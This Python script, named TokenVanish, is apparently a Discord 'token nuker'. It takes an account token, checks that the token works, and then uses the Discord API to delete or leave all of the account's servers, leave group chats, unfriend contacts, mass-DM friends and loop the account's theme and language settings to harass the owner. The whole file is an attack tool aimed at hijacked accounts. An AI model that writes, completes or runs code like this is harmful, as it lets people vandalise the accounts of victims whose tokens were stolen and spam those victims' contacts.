import asyncio
import json
import random
import string
from typing import Any
from colorama import Fore as F
from itertools import cycle
from aiohttp import ClientSession

class TokenVanish:
    def __init__(self, token: str, cfg: dict):
        self.token = token
        self.cfg = cfg
        self.is_running = True
        valid = asyncio.run(TokenVanish.check_token(token))
        if not valid[0]:
            raise InvalidToken()
        else:
            self.token_info = valid[1]
            
        self.headers = {
            'User-Agent':'python-requests/2.31.0',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Host': 'discord.com',
            'Authorization': self.token,
            'Content-Type': 'application/json',
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEyMy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyMy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vZ2l0aHViLmNvbS9ibHVzaGllbWFnaWMvTWFnaWNTdG9yYWdlL3dpa2kiLCJyZWZlcnJpbmdfZG9tYWluIjoiZ2l0aHViLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNzEyMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9'
        }
        
    @staticmethod
    async def check_token(token: str) -> tuple[bool, dict]:
        async with ClientSession() as client:
            async with client.get(
                "https://discord.com/api/v9/users/@me",
                headers={ "Authorization": token }
            ) as r:
                if r.status == 200 or r.status == 204:
                    return (True, await r.json())
                
                return (False, None)
    
    def log(self, txt: Any):
        print(f"{F.LIGHTBLACK_EX}[{F.YELLOW}TokenVanish{F.LIGHTBLACK_EX}] {txt}")
    
    async def start(self):
        await asyncio.gather(
            self.spam_appearance(),
            self.clear_servers(),
        )
        await asyncio.gather(
            self.clear_groups(),
            self.clear_friends()
        )

            
    async def clear_servers(self):
        async with ClientSession() as client:
            async with client.get(
                "https://discord.com/api/v9/users/@me/guilds",
                headers=self.headers,
            ) as r:
                guilds = await r.json()
                for guild in guilds:
                    if not self.is_running:
                        break
                    
                    guild_id = guild["id"]
                    guild_name = guild["name"]
                    
                    async with client.post(
                        f"https://discord.com/api/v9/guilds/{guild_id}/delete",
                        headers=self.headers,
                    ) as r:
                        if r.status != 204:
                            return
                        
                        if self.cfg["log_console"]:
                            self.log(f"Left/deleted server {F.YELLOW}{guild_name} ({guild_id}){F.RESET}")
                            
                        await asyncio.sleep(1)
    
    async def clear_groups(self):
        async with ClientSession() as client:
            async with client.get(
                "https://discord.com/api/v9/users/@me/channels",
                headers=self.headers,
            ) as r:
                dms = await r.json()
                for dm in dms:
                    if not self.is_running:
                        break
                    
                    if len(dm["recipients"]) > 1:
                        group_id = dm["id"]
                        group_name = dm["name"]
                        if group_name == None:
                            usernames = [user["global_name"] or user["username"] for user in dm["recipients"]]
                            group_name = ", ".join(usernames)
                            
                        async with client.delete(
                            f"https://discord.com/api/v9/channels/{group_id}",
                            headers=self.headers,
                        ) as r:
                            if r.status != 204:
                                return
                            
                            if self.cfg["log_console"]:
                                self.log(f"Left group {F.YELLOW}{group_name} ({group_id}){F.RESET}")
                                
                            await asyncio.sleep(1)
                    
    
    async def massdm_friends(self):
        if self.cfg["massdm_messages"] == []:
            return
        
        async with ClientSession() as client:
            async with client.get(
                "https://discord.com/api/v9/users/@me/relationships",
                headers=self.headers,
            ) as r:
                friends = await r.json()
                for friend in friends:
                    if not self.is_running:
                        break
                    
                    friend_id = friend["id"]
                    friend_name = friend["user"]["global_name"] or friend["user"]["username"]
                    
                    async with client.post(
                        "https://discord.com/api/v9/users/@me/channels",
                        headers=self.headers,
                        json={ "recipients": [friend_id] }
                    ) as r:
                        data = await r.json()
                        channel_id = data["id"]
                        await asyncio.sleep(5)
                    
                    async with client.post(
                        f"https://discord.com/api/v9/channels/{channel_id}/messages",
                        headers=self.headers,
                        json={
                            "content": random.choice(self.cfg["massdm_messages"]),
                            "tts": False,
                            "flags": 0
                        }
                    ) as _:
                        print(await _.json())
                        self.log(f"DMed {F.YELLOW}{friend_name} ({friend_id}){F.RESET}")
                        await asyncio.sleep(2)
                        
                    
    
    async def clear_friends(self):
        async with ClientSession() as client:
            async with client.get(
                "https://discord.com/api/v9/users/@me/relationships",
                headers=self.headers,
            ) as r:
                friends = await r.json()
                for friend in friends:
                    if not self.is_running:
                        break
                    
                    friend_id = friend["id"]
                    friend_name = friend["user"]["global_name"] or friend["user"]["username"]
                    async with client.get(
                        f"https://discord.com/api/v9/users/@me/relationships/{friend_id}",
                        headers=self.headers,

                    ) as r:
                        if r.status != 204:
                            return
                        
                        if self.cfg["log_console"]:
                            self.log(f"Unfriended {F.YELLOW}{friend_name} ({friend_id}){F.RESET}")
    
    # I WILL MURDER WHOEVER MADE AIOHTTP
    # async def create_servers(self):
    #     if self.cfg["server_names"] == []:
    #         self.cfg["server_names"] == ["Axio"]
        
    #     async with ClientSession() as client:
    #         # for _ in range(1):
    #             # if not self.is_running:
    #             #     break
                
    #             name = random.choice(self.cfg["server_names"])
    #             rand = None
    #             if len(name) < 100:
    #                 rand = "".join(random.choices(string.ascii_letters, k=(100 - len(name)) - 1))
    #                 name = name + f" {rand}"
                    
    #             print(name)
                
    #             async with client.post(
    #                 "https://discord.com/api/v9/guilds",
    #                 headers=self.headers,
    #                 data=json.dumps({
    #                     "name": "hi",
    #                     "icon": None,
    #                     "channels": [],
    #                     "system_channel_id": None,
    #                 })
    #             ) as response:
    #                 print(response.status)
    #                 print(response.headers)
    #                 print(response._request_info.headers)
    #                 response_text = await response.text()
    #                 print(response_text)
    #                 await asyncio.sleep(0.5)
        
        # r = requests.post(
        #     "https://discord.com/api/v9/guilds",
        #     headers=self.headers,
        #     json=json.dumps({
        #         "name": "hi",
        #         "icon": None,
        #         "channels": [],
        #         "system_channel_id": None,
        #     })
        # )
        # print(r.json())
        # print(r.headers)
        # print(r.request.headers)
        # print(r.request.body)
    
    async def spam_appearance(self):
        modes = cycle([
            "light",
            "dark"
        ])
        langs = cycle([
            "ja",
            "zh-TW",
            "ko",
            "zh-CN",
            "it",
            "no",
            "sv-SE",
            "fi",
            "es-ES"
        ])
        
        async with ClientSession() as client:
            while self.is_running:
                async with client.patch(
                    "https://discord.com/api/v9/users/@me/settings",
                    headers=self.headers,
                    json={
                        "theme": next(modes),
                        "locale": next(langs)
                    }
                ) as _:
                    pass
            
    def stop(self):
        self.is_running = False
    
class InvalidToken(Exception):
    def __init__(self):
        self.message = "You provided an invalid token."
        super().__init__(self.message)
    
    
# Does not work properly
if __name__ == "__main__":
    tokenfucker = TokenVanish(
        "", {
            "log_console": True,
            "server_names": [
                "Hi"
            ],
            "massdm_messages": [
                "Hi"
            ]
        })
    asyncio.run(tokenfucker.start())
